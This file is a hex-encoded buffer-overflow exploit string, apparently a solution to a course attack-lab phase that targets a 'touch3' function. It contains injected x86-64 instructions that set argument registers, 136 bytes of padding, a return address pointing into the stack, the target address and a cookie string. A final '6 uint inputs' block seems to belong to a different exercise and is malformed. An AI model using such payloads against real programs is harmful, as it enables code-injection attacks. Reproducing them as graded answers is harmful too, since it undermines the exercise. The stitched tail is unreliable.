/* adding the arguments */
48 c7 c7 f0 54 61 55 48
c7 c6 f9 54 61 55 c3 00
/* padding 136-8*2 bytes */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* rsp after 2 stepi's */
58 54 61 55 00 00 00 00 
/* touch3 address */
8e 17 40 00 00 00 00 00
/* cookie string */
33 64 34 62 38 62 38 38
/* 6 uint inputs */
00 67 00 00 00
c6 00 00 00
6c 00 00 00
c4 00 00 00
70 00 00 00
9a 00 00 00
